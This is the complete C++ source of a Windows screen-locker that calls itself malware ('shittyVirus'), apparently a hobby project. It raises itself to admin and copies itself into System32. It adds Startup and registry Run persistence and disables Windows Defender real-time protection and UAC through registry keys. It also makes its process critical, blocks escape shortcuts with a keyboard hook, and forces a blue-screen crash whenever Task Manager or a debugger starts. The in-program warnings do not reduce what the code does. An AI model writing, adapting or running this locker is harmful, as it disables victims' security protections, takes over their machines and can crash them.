#ifndef UNICODE
#define UNICODE
#endif
#define WIN32_LEAN_AND_MEAN
#include <windows.h>
#include <tlhelp32.h>
#include <shlobj.h>
#include <shellapi.h>
#include <string>
#include <vector>

#pragma comment(lib, "user32.lib")
#pragma comment(lib, "advapi32.lib")
#pragma comment(lib, "shell32.lib")
#pragma comment(lib, "gdi32.lib")

// Global handles
HWND g_hLocker = 0;
HHOOK g_hHook = 0;
HANDLE g_hMonitorThread = 0;
bool g_Unlocked = false;

// Forward declarations
LRESULT CALLBACK MainProc(HWND, UINT, WPARAM, LPARAM);
LRESULT CALLBACK LockerProc(HWND, UINT, WPARAM, LPARAM);
LRESULT CALLBACK KbHook(int, WPARAM, LPARAM);
void Warnings();
void StartLocker();
void SetupPersistence();
void DisableDefenderAndUAC();
void MakeProcessCritical(BOOL critical);
void DoBSOD();
DWORD WINAPI MonitorThread(LPVOID);
void RequestAdmin();
bool IsRunningAsLocker();

// NT API definitions
typedef LONG NTSTATUS;
typedef NTSTATUS(__stdcall* pRtlSetProcessIsCritical)(BOOLEAN, PBOOLEAN, BOOLEAN);
typedef NTSTATUS(__stdcall* pNtRaiseHardError)(NTSTATUS, ULONG, ULONG, PVOID, ULONG, PULONG);

// Decide behaviour: dropper or locker
int WINAPI wWinMain(HINSTANCE hInst, HINSTANCE, PWSTR pCmdLine, int nShow)
{
    if (IsRunningAsLocker()) {
        // Act as the actual locker
        SetupPersistence();
        DisableDefenderAndUAC();
        MakeProcessCritical(TRUE);
        g_hMonitorThread = CreateThread(0, 0, MonitorThread, 0, 0, 0);
        g_hHook = SetWindowsHookEx(WH_KEYBOARD_LL, KbHook, GetModuleHandle(0), 0);

        int x = GetSystemMetrics(SM_XVIRTUALSCREEN), y = GetSystemMetrics(SM_YVIRTUALSCREEN);
        int w = GetSystemMetrics(SM_CXVIRTUALSCREEN), h = GetSystemMetrics(SM_CYVIRTUALSCREEN);
        const wchar_t CLS[] = L"LockerWnd";
        WNDCLASS wc = {};
        wc.lpfnWndProc = LockerProc;
        wc.hInstance = GetModuleHandle(0);
        wc.lpszClassName = CLS;
        wc.hCursor = LoadCursor(0, IDC_ARROW);
        wc.hbrBackground = (HBRUSH)GetStockObject(BLACK_BRUSH);
        RegisterClass(&wc);

        g_hLocker = CreateWindowEx(WS_EX_TOPMOST | WS_EX_TOOLWINDOW, CLS, L"",
            WS_POPUP | WS_VISIBLE, x, y, w, h, 0, 0, GetModuleHandle(0), 0);
        SetWindowPos(g_hLocker, HWND_TOPMOST, 0, 0, 0, 0, SWP_NOMOVE | SWP_NOSIZE);

        MSG m;
        while (GetMessage(&m, 0, 0, 0)) { TranslateMessage(&m); DispatchMessage(&m); }

        // Cleanup after unlock
        g_Unlocked = true;
        TerminateThread(g_hMonitorThread, 0);
        UnhookWindowsHookEx(g_hHook);
        MakeProcessCritical(FALSE);
        return 0;
    }

    // Dropper mode
    RequestAdmin();
    Warnings();
    const wchar_t CLS[] = L"MainWnd";
    WNDCLASS wc = {};
    wc.lpfnWndProc = MainProc;
    wc.hInstance = hInst;
    wc.lpszClassName = CLS;
    wc.hCursor = LoadCursor(0, IDC_ARROW);
    RegisterClass(&wc);
    HWND hWnd = CreateWindowEx(0, CLS, L"Confirmation",
        WS_OVERLAPPEDWINDOW & ~WS_THICKFRAME & ~WS_MAXIMIZEBOX,
        CW_USEDEFAULT, CW_USEDEFAULT, 400, 180, 0, 0, hInst, 0);
    CreateWindow(L"BUTTON", L"Are you sure?", WS_VISIBLE | WS_CHILD | BS_AUTOCHECKBOX,
        50, 40, 300, 30, hWnd, (HMENU)100, hInst, 0);
    CreateWindow(L"BUTTON", L"Start", WS_VISIBLE | WS_CHILD | BS_DEFPUSHBUTTON,
        150, 90, 100, 30, hWnd, (HMENU)101, hInst, 0);
    ShowWindow(hWnd, nShow);
    UpdateWindow(hWnd);
    MSG m;
    while (GetMessage(&m, 0, 0, 0)) { TranslateMessage(&m); DispatchMessage(&m); }
    return 0;
}

// Check if we are running as the dropped locker (by path or argument)
bool IsRunningAsLocker()
{
    wchar_t myPath[MAX_PATH];
    GetModuleFileName(0, myPath, MAX_PATH);
    std::wstring pathStr = myPath;
    // If the executable is in System32 and named loll.exe, run as locker
    if (pathStr.find(L"\\system32\\loll.exe") != std::wstring::npos ||
        pathStr.find(L"\\SysWOW64\\loll.exe") != std::wstring::npos)
        return true;
    // Check command line for "--locker" flag
    std::wstring cmdLine = GetCommandLine();
    if (cmdLine.find(L"--locker") != std::wstring::npos)
        return true;
    return false;
}

void RequestAdmin()
{
    BOOL isAdmin = FALSE;
    PSID adminGroup;
    SID_IDENTIFIER_AUTHORITY NtAuthority = SECURITY_NT_AUTHORITY;
    if (AllocateAndInitializeSid(&NtAuthority, 2, SECURITY_BUILTIN_DOMAIN_RID,
        DOMAIN_ALIAS_RID_ADMINS, 0, 0, 0, 0, 0, 0, &adminGroup))
    {
        CheckTokenMembership(0, adminGroup, &isAdmin);
        FreeSid(adminGroup);
    }
    if (!isAdmin)
    {
        wchar_t path[MAX_PATH];
        GetModuleFileName(0, path, MAX_PATH);
        SHELLEXECUTEINFO sei = { sizeof(sei) };
        sei.lpVerb = L"runas";
        sei.lpFile = path;
        sei.nShow = SW_NORMAL;
        if (ShellExecuteEx(&sei))
            ExitProcess(0);
    }
}

void Warnings()
{
    MessageBox(0, L"WARN malicious programm. "
        L"this is malicious program. "
        L"Proceed only if you know what you doing.",
        L"shittyVirus", MB_OK | MB_ICONWARNING | MB_SYSTEMMODAL);
    MessageBox(0, L"WARN 2: "
        L"this is simple locker virus with blocking shortcuts"
        L"closing it with anything will cause bsod :0",
        L"shittyVirus", MB_OK | MB_ICONSTOP | MB_SYSTEMMODAL);
}

LRESULT CALLBACK MainProc(HWND h, UINT m, WPARAM w, LPARAM l)
{
    if (m == WM_COMMAND && LOWORD(w) == 101) {
        if (SendMessage(GetDlgItem(h, 100), BM_GETCHECK, 0, 0) == BST_CHECKED) {
            if (IDYES == MessageBox(h, L"Pre-Final warn: are you sure to execute malware?",
                L"Last chance", MB_YESNO | MB_ICONEXCLAMATION | MB_DEFBUTTON2)) {
                DestroyWindow(h);
                StartLocker();
            }
        } else MessageBox(h, L"Check 'Really Sure?' first.", L"Notice", MB_OK);
    }
    if (m == WM_DESTROY) PostQuitMessage(0);
    return DefWindowProc(h, m, w, l);
}

// Keyboard hook – blocks dangerous shortcuts only (unlock now via GUI)
LRESULT CALLBACK KbHook(int code, WPARAM w, LPARAM l)
{
    if (code == HC_ACTION && (w == WM_KEYDOWN || w == WM_SYSKEYDOWN)) {
        KBDLLHOOKSTRUCT* p = (KBDLLHOOKSTRUCT*)l;
        bool alt = GetAsyncKeyState(VK_MENU) & 0x8000;
        bool ctrl = GetAsyncKeyState(VK_CONTROL) & 0x8000;
        bool shift = GetAsyncKeyState(VK_SHIFT) & 0x8000;
        bool win = (GetAsyncKeyState(VK_LWIN) & 0x8000) || (GetAsyncKeyState(VK_RWIN) & 0x8000);

        if ((alt && p->vkCode == VK_F4) ||
            (alt && p->vkCode == VK_TAB) ||
            (alt && p->vkCode == VK_SPACE) ||
            (alt && p->vkCode == VK_ESCAPE) ||
            (ctrl && shift && p->vkCode == VK_ESCAPE) ||
            (ctrl && p->vkCode == VK_ESCAPE) ||
            (win && p->vkCode == 'R') ||
            (win && p->vkCode == 'E') ||
            (win && p->vkCode == VK_TAB) ||
            p->vkCode == VK_LWIN || p->vkCode == VK_RWIN)
            return 1;
    }
    return CallNextHookEx(g_hHook, code, w, l);
}

// Locker window with password input
LRESULT CALLBACK LockerProc(HWND h, UINT m, WPARAM w, LPARAM l)
{
    static HWND hPassEdit, hEnterBtn;
    static HFONT hFont;

    switch (m)
    {
    case WM_CREATE:
    {
        // Create UI elements once
        hFont = CreateFont(36, 0, 0, 0, FW_BOLD, 0, 0, 0, DEFAULT_CHARSET,
            OUT_DEFAULT_PRECIS, CLIP_DEFAULT_PRECIS, DEFAULT_QUALITY,
            DEFAULT_PITCH | FF_DONTCARE, L"Consolas");

        hPassEdit = CreateWindow(L"EDIT", L"",
            WS_CHILD | WS_VISIBLE | WS_BORDER | ES_PASSWORD,
            100, 300, 200, 40, h, 0, GetModuleHandle(0), 0);
        SendMessage(hPassEdit, WM_SETFONT, (WPARAM)hFont, TRUE);

        hEnterBtn = CreateWindow(L"BUTTON", L"Enter",
            WS_CHILD | WS_VISIBLE | BS_DEFPUSHBUTTON,
            120, 360, 150, 40, h, (HMENU)102, GetModuleHandle(0), 0);
        SendMessage(hEnterBtn, WM_SETFONT, (WPARAM)hFont, TRUE);

        SetFocus(hPassEdit);
        break;
    }
    case WM_PAINT:
    {
        PAINTSTRUCT ps;
        HDC dc = BeginPaint(h, &ps);
        RECT r;
        GetClientRect(h, &r);

        // Black background
        HBRUSH black = CreateSolidBrush(RGB(0, 0, 0));
        FillRect(dc, &r, black);
        DeleteObject(black);

        SetBkMode(dc, TRANSPARENT);
        SetTextColor(dc, RGB(255, 0, 0));

        // Main warning
        HFONT bigFont = CreateFont(48, 0, 0, 0, FW_BOLD, 0, 0, 0, DEFAULT_CHARSET,
            OUT_DEFAULT_PRECIS, CLIP_DEFAULT_PRECIS, DEFAULT_QUALITY,
            DEFAULT_PITCH | FF_DONTCARE, L"Consolas");
        SelectObject(dc, bigFont);
        RECT topRect = r;
        topRect.bottom = 250;
        DrawText(dc, L"YOUR PC IS LOCKED", -1, &topRect, DT_CENTER | DT_VCENTER | DT_SINGLELINE);
        DeleteObject(bigFont);

        // Subtitle with author
        SetTextColor(dc, RGB(200, 200, 200));
        HFONT smallFont = CreateFont(24, 0, 0, 0, FW_NORMAL, 0, 0, 0, DEFAULT_CHARSET,
            OUT_DEFAULT_PRECIS, CLIP_DEFAULT_PRECIS, DEFAULT_QUALITY,
            DEFAULT_PITCH | FF_DONTCARE, L"Consolas");
        SelectObject(dc, smallFont);
        RECT subRect = r;
        subRect.top = 260;
        subRect.bottom = 290;
        DrawText(dc, L"made by mindyloozy   https://github.com/MindyLozy", -1, &subRect, DT_CENTER | DT_VCENTER | DT_SINGLELINE);
        DeleteObject(smallFont);

        EndPaint(h, &ps);
        return 0;
    }
    case WM_COMMAND:
        if (LOWORD(w) == 102 && HIWORD(w) == BN_CLICKED) {
            // Enter button clicked
            wchar_t buffer[128];
            GetWindowText(hPassEdit, buffer, 128);
            if (wcscmp(buffer, L"unlock123") == 0) { // Password: unlock123
                DestroyWindow(h);
            }
            else {
                MessageBox(h, L"Incorrect password.", L"Error", MB_OK | MB_ICONERROR);
                SetWindowText(hPassEdit, L"");
                SetFocus(hPassEdit);
            }
        }
        break;
    case WM_CLOSE:
    case WM_SYSCOMMAND:
        return 0;
    case WM_DESTROY:
        DeleteObject(hFont);
        PostQuitMessage(0);
        break;
    }
    return DefWindowProc(h, m, w, l);
}

// Drop the locker into System32 and execute it
void StartLocker()
{
    // Copy self to C:\Windows\System32\loll.exe (requires admin)
    wchar_t systemPath[MAX_PATH];
    GetSystemDirectory(systemPath, MAX_PATH);
    wcscat_s(systemPath, L"\\loll.exe");
    wchar_t myPath[MAX_PATH];
    GetModuleFileName(0, myPath, MAX_PATH);
    CopyFile(myPath, systemPath, FALSE);

    // Launch the dropped locker with --locker flag
    std::wstring args = L"--locker";
    SHELLEXECUTEINFO sei = { sizeof(sei) };
    sei.lpVerb = L"open";
    sei.lpFile = systemPath;
    sei.lpParameters = args.c_str();
    sei.nShow = SW_NORMAL;
    ShellExecuteEx(&sei);

    ExitProcess(0);
}

// Persistence: makes the locker start with Windows (for the dropped locker)
void SetupPersistence()
{
    wchar_t path[MAX_PATH];
    GetModuleFileName(0, path, MAX_PATH);
    wchar_t startup[MAX_PATH];
    if (SHGetFolderPath(0, CSIDL_STARTUP, 0, 0, startup) == S_OK) {
        wcscat_s(startup, L"\\loll.lnk"); // Use a shortcut to avoid UAC issues
        // Create shortcut
        IShellLink* psl;
        IPersistFile* ppf;
        CoInitialize(0);
        if (SUCCEEDED(CoCreateInstance(CLSID_ShellLink, 0, CLSCTX_INPROC_SERVER, IID_IShellLink, (void**)&psl))) {
            psl->SetPath(path);
            psl->SetArguments(L"--locker");
            if (SUCCEEDED(psl->QueryInterface(IID_IPersistFile, (void**)&ppf))) {
                ppf->Save(startup, TRUE);
                ppf->Release();
            }
            psl->Release();
        }
        CoUninitialize();
    }
    // Registry Run (HKCU) as well
    HKEY hKey;
    if (RegOpenKeyEx(HKEY_CURRENT_USER, L"Software\\Microsoft\\Windows\\CurrentVersion\\Run", 0, KEY_SET_VALUE, &hKey) == ERROR_SUCCESS) {
        std::wstring cmdLine = std::wstring(path) + L" --locker";
        RegSetValueEx(hKey, L"WindowsService", 0, REG_SZ, (BYTE*)cmdLine.c_str(), (DWORD)((cmdLine.length() + 1) * sizeof(wchar_t)));
        RegCloseKey(hKey);
    }
}

// Disables Windows Defender and UAC (admin required)
void DisableDefenderAndUAC()
{
    HKEY hKey;
    if (RegCreateKeyEx(HKEY_LOCAL_MACHINE, L"SOFTWARE\\Policies\\Microsoft\\Windows Defender", 0, 0, 0, KEY_SET_VALUE, 0, &hKey, 0) == ERROR_SUCCESS) {
        DWORD val = 1;
        RegSetValueEx(hKey, L"DisableAntiSpyware", 0, REG_DWORD, (BYTE*)&val, sizeof(val));
        RegCloseKey(hKey);
    }
    if (RegCreateKeyEx(HKEY_LOCAL_MACHINE, L"SOFTWARE\\Policies\\Microsoft\\Windows Defender\\Real-Time Protection", 0, 0, 0, KEY_SET_VALUE, 0, &hKey, 0) == ERROR_SUCCESS) {
        DWORD val = 1;
        RegSetValueEx(hKey, L"DisableRealtimeMonitoring", 0, REG_DWORD, (BYTE*)&val, sizeof(val));
        RegCloseKey(hKey);
    }
    if (RegCreateKeyEx(HKEY_LOCAL_MACHINE, L"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System", 0, 0, 0, KEY_SET_VALUE, 0, &hKey, 0) == ERROR_SUCCESS) {
        DWORD val = 0;
        RegSetValueEx(hKey, L"EnableLUA", 0, REG_DWORD, (BYTE*)&val, sizeof(val));
        RegSetValueEx(hKey, L"ConsentPromptBehaviorAdmin", 0, REG_DWORD, (BYTE*)&val, sizeof(val));
        RegCloseKey(hKey);
    }
}

void MakeProcessCritical(BOOL critical)
{
    HMODULE ntdll = GetModuleHandle(L"ntdll.dll");
    if (ntdll) {
        pRtlSetProcessIsCritical RtlSetProcessIsCritical =
            (pRtlSetProcessIsCritical)GetProcAddress(ntdll, "RtlSetProcessIsCritical");
        if (RtlSetProcessIsCritical) {
            BOOLEAN tmp;
            RtlSetProcessIsCritical(critical ? 1 : 0, &tmp, 0);
        }
    }
}

void DoBSOD()
{
    HMODULE ntdll = GetModuleHandle(L"ntdll.dll");
    if (ntdll) {
        pRtlSetProcessIsCritical RtlSetProcessIsCritical =
            (pRtlSetProcessIsCritical)GetProcAddress(ntdll, "RtlSetProcessIsCritical");
        pNtRaiseHardError NtRaiseHardError =
            (pNtRaiseHardError)GetProcAddress(ntdll, "NtRaiseHardError");

        if (RtlSetProcessIsCritical) {
            BOOLEAN tmp;
            RtlSetProcessIsCritical(0, &tmp, 0);
        }

        if (NtRaiseHardError) {
            ULONG response;
            NtRaiseHardError(0xC0000420, 0, 0, 0, 6, &response);
        }
    }
    TerminateProcess(OpenProcess(PROCESS_TERMINATE, FALSE, 4), 1);
}

DWORD WINAPI MonitorThread(LPVOID)
{
    const std::vector<std::wstring> blacklist = {
        L"taskmgr.exe",
        L"procexp.exe", L"procmon.exe",
        L"processhacker.exe", L"ProcessHacker.exe",
        L"artmoney.exe", L"ArtMoney.exe",
        L"cheatengine-x86_64.exe", L"cheatengine-i386.exe",
        L"ollydbg.exe", L"windbg.exe", L"x64dbg.exe",
        L"ida.exe", L"ida64.exe"
    };

    while (!g_Unlocked) {
        HANDLE snap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
        if (snap != INVALID_HANDLE_VALUE) {
            PROCESSENTRY32W pe = { sizeof(pe) };
            if (Process32FirstW(snap, &pe)) {
                do {
                    for (const auto& bad : blacklist) {
                        if (_wcsicmp(pe.szExeFile, bad.c_str()) == 0) {
                            CloseHandle(snap);
                            DoBSOD();
                            return 0;
                        }
                    }
                } while (Process32NextW(snap, &pe));
            }
            CloseHandle(snap);
        }
        Sleep(500);
    }
    return 0;
}
